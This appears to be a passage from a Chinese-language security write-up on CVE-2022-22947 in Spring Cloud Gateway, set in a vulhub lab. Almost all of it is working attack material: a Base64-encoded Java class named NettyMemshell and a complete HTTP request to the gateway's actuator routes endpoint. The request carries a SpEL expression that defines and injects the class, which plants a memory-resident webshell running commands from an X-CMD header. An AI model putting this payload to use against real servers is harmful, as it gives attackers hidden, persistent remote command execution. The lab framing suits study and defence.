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\u0026#39;),new javax.management.loading.MLet(new java.net.URL[0],T(java.lang.Thread).currentThread().getContextClassLoader())).doInject()} NettyMemshell.class -\u0026gt; Base64 编码：\nplain\r1 yv66vgAAADQBDwoAPgB6CAB7BwB8CABTBwB9CgAFAH4KAFwAfwcAgAoAXACBCgCCAIMKAIIAhAoACACFCgAFAIYIAIcKAFsAiAgASwoABQCJCgCKAH8KAIoAiwoABQCMCABOCACNBwCOCgAXAHoKAIoAjwgAkAcAkQgAkgsAkwCUCACVCACWCwCXAJgHAJkLACEAmggAmwoAnACdCgCcAJ4HAJ8KAKAAoQoAoACiCgCjAKQKACYApQgApgoAJgCnCgAmAKgJAKkAqgoAFwCrCgAbAKwLAK0ArgcArwkAsACxCQCyALMKALQAtQoAMgC2CwC3AJoJALgAuQgAugoAnAC7CwCtALwJAL0AvgsAvwDABwDBBwDCAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAA9MTmV0dHlNZW1zaGVsbDsBAAhkb0luamVjdAEAFCgpTGphdmEvbGFuZy9TdHJpbmc7AQAVX3ZhbCRkaXNwb3NhYmxlU2VydmVyAQAZTGphdmEvbGFuZy9yZWZsZWN0L0ZpZWxkOwEAFHZhbCRkaXNwb3NhYmxlU2VydmVyAQASTGphdmEvbGFuZy9PYmplY3Q7AQAHX2NvbmZpZwEABmNvbmZpZwEAEF9kb09uQ2hhbm5lbEluaXQBAAZ0aHJlYWQBAAFpAQABSQEACmdldFRocmVhZHMBABpMamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kOwEAB3RocmVhZHMBAAFlAQAVTGphdmEvbGFuZy9FeGNlcHRpb247AQADbXNnAQASTGphdmEvbGFuZy9TdHJpbmc7AQANU3RhY2tNYXBUYWJsZQcAwwcAxAEADW9uQ2hhbm5lbEluaXQBAFcoTHJlYWN0b3IvbmV0dHkvQ29ubmVjdGlvbk9ic2VydmVyO0xpby9uZXR0eS9jaGFubmVsL0NoYW5uZWw7TGphdmEvbmV0L1NvY2tldEFkZHJlc3M7KVYBABJjb25uZWN0aW9uT2JzZXJ2ZXIBACJMcmVhY3Rvci9uZXR0eS9Db25uZWN0aW9uT2JzZXJ2ZXI7AQAHY2hhbm5lbAEAGkxpby9uZXR0eS9jaGFubmVsL0NoYW5uZWw7AQANc29ja2V0QWRkcmVzcwEAGExqYXZhL25ldC9Tb2NrZXRBZGRyZXNzOwEACHBpcGVsaW5lAQAiTGlvL25ldHR5L2NoYW5uZWwvQ2hhbm5lbFBpcGVsaW5lOwEAEE1ldGhvZFBhcmFtZXRlcnMBAAtjaGFubmVsUmVhZAEAPShMaW8vbmV0dHkvY2hhbm5lbC9DaGFubmVsSGFuZGxlckNvbnRleHQ7TGphdmEvbGFuZy9PYmplY3Q7KVYBAANjbWQBAApleGVjUmVzdWx0AQALaHR0cFJlcXVlc3QBAClMaW8vbmV0dHkvaGFuZGxlci9jb2RlYy9odHRwL0h0dHBSZXF1ZXN0OwEAA2N0eAEAKExpby9uZXR0eS9jaGFubmVsL0NoYW5uZWxIYW5kbGVyQ29udGV4dDsBAApFeGNlcHRpb25zAQAEc2VuZAEAbShMaW8vbmV0dHkvY2hhbm5lbC9DaGFubmVsSGFuZGxlckNvbnRleHQ7TGphdmEvbGFuZy9TdHJpbmc7TGlvL25ldHR5L2hhbmRsZXIvY29kZWMvaHR0cC9IdHRwUmVzcG9uc2VTdGF0dXM7KVYBAAdjb250ZXh0AQAGc3RhdHVzAQAwTGlvL25ldHR5L2hhbmRsZXIvY29kZWMvaHR0cC9IdHRwUmVzcG9uc2VTdGF0dXM7AQAIcmVzcG9uc2UBAC5MaW8vbmV0dHkvaGFuZGxlci9jb2RlYy9odHRwL0Z1bGxIdHRwUmVzcG9uc2U7AQAKU291cmNlRmlsZQEAEk5ldHR5TWVtc2hlbGwuamF2YQwAQABBAQAMaW5qZWN0LXN0YXJ0AQAQamF2YS9sYW5nL1RocmVhZAEAD2phdmEvbGFuZy9DbGFzcwwAxQDGDADHAMgBABBqYXZhL2xhbmcvT2JqZWN0DADJAMoHAMsMAMwAzQwAzgDPDADQANEMANIASAEADk5ldHR5V2ViU2VydmVyDADTANQMANUA1gcA1wwAzgDYDADZANEBAA9kb09uQ2hhbm5lbEluaXQBAA1OZXR0eU1lbXNoZWxsDADaANsBAA5pbmplY3Qtc3VjY2VzcwEAE2phdmEvbGFuZy9FeGNlcHRpb24BAAxpbmplY3QtZXJyb3IHANwMAGUA3QEAH3JlYWN0b3IubGVmdC5odHRwVHJhZmZpY0hhbmRsZXIBABBtZW1zaGVsbF9oYW5kbGVyBwDeDADfAOABACdpby9uZXR0eS9oYW5kbGVyL2NvZGVjL2h0dHAvSHR0cFJlcXVlc3QMAOEA4gEABVgtQ01EBwDjDADTAOQMAM4A5QEAEWphdmEvdXRpbC9TY2FubmVyBwDmDADnAOgMAOkA6gcA6wwA7ADtDABAAO4BAAJcQQwA7wDwDADxAEgHAPIMAPMAdQwAcQByDAD0AEEHAPUMAPYA9wEAM2lvL25ldHR5L2hhbmRsZXIvY29kZWMvaHR0cC9EZWZhdWx0RnVsbEh0dHBSZXNwb25zZQcA+AwA+QD6BwD7DAD8AP0HAP4MAP8BAAwAQAEBBwECBwEDDAEEAQUBABl0ZXh0L3BsYWluOyBjaGFyc2V0PVVURi04DADaAQYMAQcBCAcBCQwBCgELBwEMDAENAQ4BACVpby9uZXR0eS9jaGFubmVsL0NoYW5uZWxEdXBsZXhIYW5kbGVyAQAncmVhY3Rvci9uZXR0eS9DaGFubmVsUGlwZWxpbmVDb25maWd1cmVyAQAQamF2YS9sYW5nL1N0cmluZwEAGGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZAEAEWdldERlY2xhcmVkTWV0aG9kAQBAKExqYXZhL2xhbmcvU3RyaW5nO1tMamF2YS9sYW5nL0NsYXNzOylMamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kOwEADXNldEFjY2Vzc2libGUBAAQoWilWAQAGaW52b2tlAQA5KExqYXZhL2xhbmcvT2JqZWN0O1tMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7AQAXamF2YS9sYW5nL3JlZmxlY3QvQXJyYXkBAAlnZXRMZW5ndGgBABUoTGphdmEvbGFuZy9PYmplY3Q7KUkBAANnZXQBACcoTGphdmEvbGFuZy9PYmplY3Q7SSlMamF2YS9sYW5nL09iamVjdDsBAAhnZXRDbGFzcwEAEygpTGphdmEvbGFuZy9DbGFzczsBAAdnZXROYW1lAQAIY29udGFpbnMBABsoTGphdmEvbGFuZy9DaGFyU2VxdWVuY2U7KVoBABBnZXREZWNsYXJlZEZpZWxkAQAtKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL3JlZmxlY3QvRmllbGQ7AQAXamF2YS9sYW5nL3JlZmxlY3QvRmllbGQBACYoTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwEADWdldFN1cGVyY2xhc3MBAANzZXQBACcoTGphdmEvbGFuZy9PYmplY3Q7TGphdmEvbGFuZy9PYmplY3Q7KVYBABhpby9uZXR0eS9jaGFubmVsL0NoYW5uZWwBACQoKUxpby9uZXR0eS9jaGFubmVsL0NoYW5uZWxQaXBlbGluZTsBACBpby9uZXR0eS9jaGFubmVsL0NoYW5uZWxQaXBlbGluZQEACWFkZEJlZm9yZQEAaShMamF2YS9sYW5nL1N0cmluZztMamF2YS9sYW5nL1N0cmluZztMaW8vbmV0dHkvY2hhbm5lbC9DaGFubmVsSGFuZGxlcjspTGlvL25ldHR5L2NoYW5uZWwvQ2hhbm5lbFBpcGVsaW5lOwEAB2hlYWRlcnMBACsoKUxpby9uZXR0eS9oYW5kbGVyL2NvZGVjL2h0dHAvSHR0cEhlYWRlcnM7AQAnaW8vbmV0dHkvaGFuZGxlci9jb2RlYy9odHRwL0h0dHBIZWFkZXJzAQAVKExqYXZhL2xhbmcvU3RyaW5nOylaAQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZzsBABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7AQARamF2YS9sYW5nL1Byb2Nlc3MBAA5nZXRJbnB1dFN0cmVhbQEAFygpTGphdmEvaW8vSW5wdXRTdHJlYW07AQAYKExqYXZhL2lvL0lucHV0U3RyZWFtOylWAQAMdXNlRGVsaW1pdGVyAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS91dGlsL1NjYW5uZXI7AQAEbmV4dAEALmlvL25ldHR5L2hhbmRsZXIvY29kZWMvaHR0cC9IdHRwUmVzcG9uc2VTdGF0dXMBAAJPSwEAD3ByaW50U3RhY2tUcmFjZQEAJmlvL25ldHR5L2NoYW5uZWwvQ2hhbm5lbEhhbmRsZXJDb250ZXh0AQAPZmlyZUNoYW5uZWxSZWFkAQA8KExqYXZhL2xhbmcvT2JqZWN0OylMaW8vbmV0dHkvY2hhbm5lbC9DaGFubmVsSGFuZGxlckNvbnRleHQ7AQAnaW8vbmV0dHkvaGFuZGxlci9jb2RlYy9odHRwL0h0dHBWZXJzaW9uAQAISFRUUF8xXzEBAClMaW8vbmV0dHkvaGFuZGxlci9jb2RlYy9odHRwL0h0dHBWZXJzaW9uOwEAGWlvL25ldHR5L3V0aWwvQ2hhcnNldFV0aWwBAAVVVEZfOAEAGkxqYXZhL25pby9jaGFyc2V0L0NoYXJzZXQ7AQAYaW8vbmV0dHkvYnVmZmVyL1VucG9vbGVkAQAMY29waWVkQnVmZmVyAQBNKExqYXZhL2xhbmcvQ2hhclNlcXVlbmNlO0xqYXZhL25pby9jaGFyc2V0L0NoYXJzZXQ7KUxpby9uZXR0eS9idWZmZXIvQnl0ZUJ1ZjsBAHUoTGlvL25ldHR5L2hhbmRsZXIvY29kZWMvaHR0cC9IdHRwVmVyc2lvbjtMaW8vbmV0dHkvaGFuZGxlci9jb2RlYy9odHRwL0h0dHBSZXNwb25zZVN0YXR1cztMaW8vbmV0dHkvYnVmZmVyL0J5dGVCdWY7KVYBACxpby9uZXR0eS9oYW5kbGVyL2NvZGVjL2h0dHAvRnVsbEh0dHBSZXNwb25zZQEAK2lvL25ldHR5L2hhbmRsZXIvY29kZWMvaHR0cC9IdHRwSGVhZGVyTmFtZXMBAAxDT05URU5UX1RZUEUBABtMaW8vbmV0dHkvdXRpbC9Bc2NpaVN0cmluZzsBAFUoTGphdmEvbGFuZy9DaGFyU2VxdWVuY2U7TGphdmEvbGFuZy9PYmplY3Q7KUxpby9uZXR0eS9oYW5kbGVyL2NvZGVjL2h0dHAvSHR0cEhlYWRlcnM7AQANd3JpdGVBbmRGbHVzaAEANChMamF2YS9sYW5nL09iamVjdDspTGlvL25ldHR5L2NoYW5uZWwvQ2hhbm5lbEZ1dHVyZTsBACZpby9uZXR0eS9jaGFubmVsL0NoYW5uZWxGdXR1cmVMaXN0ZW5lcgEABUNMT1NFAQAoTGlvL25ldHR5L2NoYW5uZWwvQ2hhbm5lbEZ1dHVyZUxpc3RlbmVyOwEAHmlvL25ldHR5L2NoYW5uZWwvQ2hhbm5lbEZ1dHVyZQEAC2FkZExpc3RlbmVyAQBSKExpby9uZXR0eS91dGlsL2NvbmN1cnJlbnQvR2VuZXJpY0Z1dHVyZUxpc3RlbmVyOylMaW8vbmV0dHkvY2hhbm5lbC9DaGFubmVsRnV0dXJlOwAhABcAPgABAD8AAAAFAAEAQABBAAEAQgAAAC8AAQABAAAABSq3AAGxAAAAAgBDAAAABgABAAAADgBEAAAADAABAAAABQBFAEYAAAAJAEcASAABAEIAAAHDAAQACgAAALUSAksSAxIEA70ABbYABkwrBLYABysBA70ACLYACU0DPh0suAAKogCHLB24AAs6BBkExgB1GQS2AAy2AA0SDrYAD5kAZRkEtgAMEhC2ABE6BRkFBLYAEhkFGQS2ABM6BhkGtgAMtgAUEhW2ABE6BxkHBLYAEhkHGQa2ABM6CBkItgAMtgAUtgAUEha2ABE6CRkJBLYAEhkJGQi7ABdZtwAYtgAZEhpLhAMBp/93pwAHTBIcSyqwAAEAAwCsAK8AGwADAEMAAABaABYAAAAQAAMAEgAPABMAFAAUAB4AFgAoABcALwAYAEQAGQBQABoAVgAbAF8AHABuAB0AdAAeAH0AHwCPACAAlQAhAKMAIgCmABYArAAnAK8AJQCwACYAswAoAEQAAABwAAsAUABWAEkASgAFAF8ARwBLAEwABgBuADgATQBKAAcAfQApAE4ATAAIAI8AFwBPAEoACQAvAHcAUABMAAQAIACMAFEAUgADAA8AnQBTAFQAAQAeAI4AVQBMAAIAsAADAFYAVwABAAMAsgBYAFkAAABaAAAAHgAF/wAgAAQHAFsHAFwHAAgBAAD7AIX4AAVCBwAbAwABAF0AXgACAEIAAAB2AAUABQAAABwsuQAdAQA6BBkEEh4SH7sAF1m3ABi5ACAEAFexAAAAAgBDAAAADgADAAAALgAIADAAGwAxAEQAAAA0AAUAAAAcAEUARgAAAAAAHABfAGAAAQAAABwAYQBiAAIAAAAcAGMAZAADAAgAFABlAGYABABnAAAADQMAXwAAAGEAAABjAAAAAQBoAGkAAwBCAAABEAAEAAYAAABhLMEAIZkAVCzAACFOLbkAIgEAEiO2ACSZADctuQAiAQASI7YAJToEuwAmWbgAJxkEtgAotgAptwAqEiu2ACy2AC06BSorGQWyAC63AC+xpwAKOgQZBLYAMCssuQAxAgBXsQABAAwATQBRABsAAwBDAAAAMgAMAAAANwAHADgADAA6ABoAOwAnADwAQwA+AE0APwBOAEMAUQBBAFMAQgBYAEUAYABGAEQAAABIAAcAJwAnAGoAWQAEAEMACwBrAFkABQBTAAUAVgBXAAQADABMAGwAbQADAAAAYQBFAEYAAAAAAGEAbgBvAAEAAABhAFgATAACAFoAAAAPAAP8AE4HACFCBwAb+gAGAHAAAAAEAAEAGwBnAAAACQIAbgAAAFgAAAACAHEAcgACAEIAAACUAAYABQAAADa7ADJZsgAzLSyyADS4ADW3ADY6BBkEuQA3AQCyADgSObYAOlcrGQS5ADsCALIAPLkAPQIAV7EAAAACAEMAAAASAAQAAABKABQASwAkAEwANQBNAEQAAAA0AAUAAAA2AEUARgAAAAAANgBuAG8AAQAAADYAcwBZAAIAAAA2AHQAdQADABQAIgB2AHcABABnAAAADQMAbgAAAHMAAAB0AAAAAQB4AAAAAgB5 使用 vulhub/spring/CVE-2022-22947 环境\nplain\r1 docker compose up -d 传入内存马：\nplain\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 POST /actuator/gateway/routes/memshell HTTP/1.1 Host: 192.168.31.16:8080 Content-Type: application/json { \u0026#34;predicates\u0026#34;: [ { \u0026#34;name\u0026#34;: \u0026#34;Path\u0026#34;, \u0026#34;args\u0026#34;: { \u0026#34;_genkey_0\u0026#34;: \u0026#34;/memshell/**\u0026#34; } } ], \u0026#34;filters\u0026#34;: [ { \u0026#34;name\u0026#34;: \u0026#34;RewritePath\u0026#34;, \u0026#34;args\u0026#34;: { \u0026#34;_genkey_0\u0026#34;: \u0026#34;#{T(org.springframework.cglib.core.ReflectUtils).defineClass(\u0026#39;NettyMemshell\u0026#39;,T(org.springframework.util.Base64Utils).decodeFromString(\u0026#39;yv66vgAAADQBDwoAPgB6CAB7BwB8CABTBwB9CgAFAH4KAFwAfwcAgAoAXACBCgCCAIMKAIIAhAoACACFCgAFAIYIAIcKAFsAiAgASwoABQCJCgCKAH8KAIoAiwoABQCMCABOCACNBwCOCgAXAHoKAIoAjwgAkAcAkQgAkgsAkwCUCACVCACWCwCXAJgHAJkLACEAmggAmwoAnACdCgCcAJ4HAJ8KAKAAoQoAoACiCgCjAKQKACYApQgApgoAJgCnCgAmAKgJAKkAqgoAFwCrCgAbAKwLAK0ArgcArwkAsACxCQCyALMKALQAtQoAMgC2CwC3AJoJALgAuQgAugoAnAC7CwCtALwJAL0AvgsAvwDABwDBBwDCAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAA9MTmV0dHlNZW1zaGVsbDsBAAhkb0luamVjdAEAFCgpTGphdmEvbGFuZy9TdHJpbmc7AQAVX3ZhbCRkaXNwb3NhYmxlU2VydmVyAQAZTGphdmEvbGFuZy9yZWZsZWN0L0ZpZWxkOwEAFHZhbCRkaXNwb3NhYmxlU2VydmVyAQASTGphdmEvbGFuZy9PYmplY3Q7AQAHX2NvbmZpZwEABmNvbmZpZwEAEF9kb09uQ2hhbm5lbEluaXQBAAZ0aHJlYWQBAAFpAQABSQEACmdldFRocmVhZHMBABpMamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kOwEAB3RocmVhZHMBAAFlAQAVTGphdmEvbGFuZy9FeGNlcHRpb247AQADbXNnAQASTGphdmEvbGFuZy9TdHJpbmc7AQANU3RhY2tNYXBUYWJsZQcAwwcAxAEADW9uQ2hhbm5lbEluaXQBAFcoTHJlYWN0b3IvbmV0dHkvQ29ubmVjdGlvbk9ic2VydmVyO0xpby9uZXR0eS9jaGFubmVsL0NoYW5uZWw7TGphdmEvbmV0L1NvY2tldEFkZHJlc3M7KVYBABJjb25uZWN0aW9uT2JzZXJ2ZXIBACJMcmVhY3Rvci9uZXR0eS9Db25uZWN0aW9uT2JzZXJ2ZXI7AQAHY2hhbm5lbAEAGkxpby9uZXR0eS9jaGFubmVsL0NoYW5uZWw7AQANc29ja2V0QWRkcmVzcwEAGExqYXZhL25ldC9Tb2NrZXRBZGRyZXNzOwEACHBpcGVsaW5lAQAiTGlvL25ldHR5L2NoYW5uZWwvQ2hhbm5lbFBpcGVsaW5lOwEAEE1ldGhvZFBhcmFtZXRlcnMBAAtjaGFubmVsUmVhZAEAPShMaW8vbmV0dHkvY2hhbm5lbC9DaGFubmVsSGFuZGxlckNvbnRleHQ7TGphdmEvbGFuZy9PYmplY3Q7KVYBAANjbWQBAApleGVjUmVzdWx0AQALaHR0cFJlcXVlc3QBAClMaW8vbmV0dHkvaGFuZGxlci9jb2RlYy9odHRwL0h0dHBSZXF1ZXN0OwEAA2N0eAEAKExpby9uZXR0eS9jaGFubmVsL0NoYW5uZWxIYW5kbGVyQ29udGV4dDsBAApFeGNlcHRpb25zAQAEc2VuZAEAbShMaW8vbmV0dHkvY2hhbm5lbC9DaGFubmVsSGFuZGxlckNvbnRleHQ7TGphdmEvbGFuZy9TdHJpbmc7TGlvL25ldHR5L2hhbmRsZXIvY29kZWMvaHR0cC9IdHRwUmVzcG9uc2VTdGF0dXM7KVYBAAdjb250ZXh0AQAGc3RhdHVzAQAwTGlvL25ldHR5L2hhbmRsZXIvY29kZWMvaHR0cC9IdHRwUmVzcG9uc2VTdGF0dXM7AQAIcmVzcG9uc2UBAC5MaW8vbmV0dHkvaGFuZGxlci9jb2RlYy9odHRwL0Z1bGxIdHRwUmVzcG9uc2U7AQAKU291cmNlRmlsZQEAEk5ldHR5TWVtc2hlbGwuamF2YQwAQABBAQAMaW5qZWN0LXN0YXJ0AQAQamF2YS9sYW5nL1RocmVhZAEAD2phdmEvbGFuZy9DbGFzcwwAxQDGDADHAMgBABBqYXZhL2xhbmcvT2JqZWN0DADJAMoHAMsMAMwAzQwAzgDPDADQANEMANIASAEADk5ldHR5V2ViU2VydmVyDADTANQMANUA1gcA1wwAzgDYDADZANEBAA9kb09uQ2hhbm5lbEluaXQBAA1OZXR0eU1lbXNoZWxsDADaANsBAA5pbmplY3Qtc3VjY2VzcwEAE2phdmEvbGFuZy9FeGNlcHRpb24BAAxpbmplY3QtZXJyb3IHANwMAGUA3QEAH3JlYWN0b3IubGVmdC5odHRwVHJhZmZpY0hhbmRsZXIBABBtZW1zaGVsbF9oYW5kbGVyBwDeDADfAOABACdpby9uZXR0eS9oYW5kbGVyL2NvZGVjL2h0dHAvSHR0cFJlcXVlc3QMAOEA4gEABVgtQ01EBwDjDADTAOQMAM4A5QEAEWphdmEvdXRpbC9TY2FubmVyBwDmDADnAOgMAOkA6gcA6wwA7ADtDABAAO4BAAJcQQwA7wDwDADxAEgHAPIMAPMAdQwAcQByDAD0AEEHAPUMAPYA9wEAM2lvL25ldHR5L2hhbmRsZXIvY29kZWMvaHR0cC9EZWZhdWx0RnVsbEh0dHBSZXNwb25zZQcA+AwA+QD6BwD7DAD8AP0HAP4MAP8BAAwAQAEBBwECBwEDDAEEAQUBABl0ZXh0L3BsYWluOyBjaGFyc2V0PVVURi04DADaAQYMAQcBCAcBCQwBCgELBwEMDAENAQ4BACVpby9uZXR0eS9jaGFubmVsL0NoYW5uZWxEdXBsZXhIYW5kbGVyAQAncmVhY3Rvci9uZXR0eS9DaGFubmVsUGlwZWxpbmVDb25maWd1cmVyAQAQamF2YS9sYW5nL1N0cmluZwEAGGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZAEAEWdldERlY2xhcmVkTWV0aG9kAQBAKExqYXZhL2xhbmcvU3RyaW5nO1tMamF2YS9sYW5nL0NsYXNzOylMamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kOwEADXNldEFjY2Vzc2libGUBAAQoWilWAQAGaW52b2tlAQA5KExqYXZhL2xhbmcvT2JqZWN0O1tMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7AQAXamF2YS9sYW5nL3JlZmxlY3QvQXJyYXkBAAlnZXRMZW5ndGgBABUoTGphdmEvbGFuZy9PYmplY3Q7KUkBAANnZXQBACcoTGphdmEvbGFuZy9PYmplY3Q7SSlMamF2YS9sYW5nL09iamVjdDsBAAhnZXRDbGFzcwEAEygpTGphdmEvbGFuZy9DbGFzczsBAAdnZXROYW1lAQAIY29udGFpbnMBABsoTGphdmEvbGFuZy9DaGFyU2VxdWVuY2U7KVoBABBnZXREZWNsYXJlZEZpZWxkAQAtKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL3JlZmxlY3QvRmllbGQ7AQAXamF2YS9sYW5nL3JlZmxlY3QvRmllbGQBACYoTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwEADWdldFN1cGVyY2xhc3MBAANzZXQBACcoTGphdmEvbGFuZy9PYmplY3Q7TGphdmEvbGFuZy9PYmplY3Q7KVYBABhpby9uZXR0eS9jaGFubmVsL0NoYW5uZWwBACQoKUxpby9uZXR0eS9jaGFubmVsL0NoYW5uZWxQaXBlbGluZTsBACBpby9uZXR0eS9jaGFubmVsL0NoYW5uZWxQaXBlbGluZQEACWFkZEJlZm9yZQEAaShMamF2YS9sYW5nL1N0cmluZztMamF2YS9sYW5nL1N0cmluZztMaW8vbmV0dHkvY2hhbm5lbC9DaGFubmVsSGFuZGxlcjspTGlvL25ldHR5L2NoYW5uZWwvQ2hhbm5lbFBpcGVsaW5lOwEAB2hlYWRlcnMBACsoKUxpby9uZXR0eS9oYW5kbGVyL2NvZGVjL2h0dHAvSHR0cEhlYWRlcnM7AQAnaW8vbmV0dHkvaGFuZGxlci9jb2RlYy9odHRwL0h0dHBIZWFkZXJzAQAVKExqYXZhL2xhbmcvU3RyaW5nOylaAQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZzsBABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7AQARamF2YS9sYW5nL1Byb2Nlc3MBAA5nZXRJbnB1dFN0cmVhbQEAFygpTGphdmEvaW8vSW5wdXRTdHJlYW07AQAYKExqYXZhL2lvL0lucHV0U3RyZWFtOylWAQAMdXNlRGVsaW1pdGVyAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS91dGlsL1NjYW5uZXI7AQAEbmV4dAEALmlvL25ldHR5L2hhbmRsZXIvY29kZWMvaHR0cC9IdHRwUmVzcG9uc2VTdGF0dXMBAAJPSwEAD3ByaW50U3RhY2tUcmFjZQEAJmlvL25ldHR5L2NoYW5uZWwvQ2hhbm5lbEhhbmRsZXJDb250ZXh0AQAPZmlyZUNoYW5uZWxSZWFkAQA8KExqYXZhL2xhbmcvT2JqZWN0OylMaW8vbmV0dHkvY2hhbm5lbC9DaGFubmVsSGFuZGxlckNvbnRleHQ7AQAnaW8vbmV0dHkvaGFuZGxlci9jb2RlYy9odHRwL0h0dHBWZXJzaW9uAQAISFRUUF8xXzEBAClMaW8vbmV0dHkvaGFuZGxlci9jb2RlYy9odHRwL0h0dHBWZXJzaW9uOwEAGWlvL25ldHR5L3V0aWwvQ2hhcnNldFV0aWwBAAVVVEZfOAEAGkxqYXZhL25pby9jaGFyc2V0L0NoYXJzZXQ7AQAYaW8vbmV0dHkvYnVmZmVyL1VucG9vbGVkAQAMY29waWVkQnVmZmVyAQBNKExqYXZhL2xhbmcvQ2hhclNlcXVlbmNlO0xqYXZhL25pby9jaGFyc2V0L0NoYXJzZXQ7KUxpby9uZXR0eS9idWZmZXIvQnl0ZUJ1ZjsBAHUoTGlvL25ldHR5L2hhbmRsZXIvY29kZWMvaHR0cC9IdHRwVmVyc2lvbjtMaW8vbmV0dHkvaGFuZGxlci9jb2RlYy9odHRwL0h0dHBSZXNwb25zZVN0YXR1cztMaW8vbmV0dHkvYnVmZmVyL0J5dGVCdWY7KVYBACxpby9uZXR0eS9oYW5kbGVyL2NvZGVjL2h0dHAvRnVsbEh0dHBSZXNwb25zZQEAK2lvL25ldHR5L2hhbmRsZXIvY29kZWMvaHR0cC9IdHRwSGVhZGVyTmFtZXMBAAxDT05URU5UX1RZUEUBABtMaW8vbmV0dHkvdXRpbC9Bc2NpaVN0cmluZzsBAFUoTGphdmEvbGFuZy9DaGFyU2VxdWVuY2U7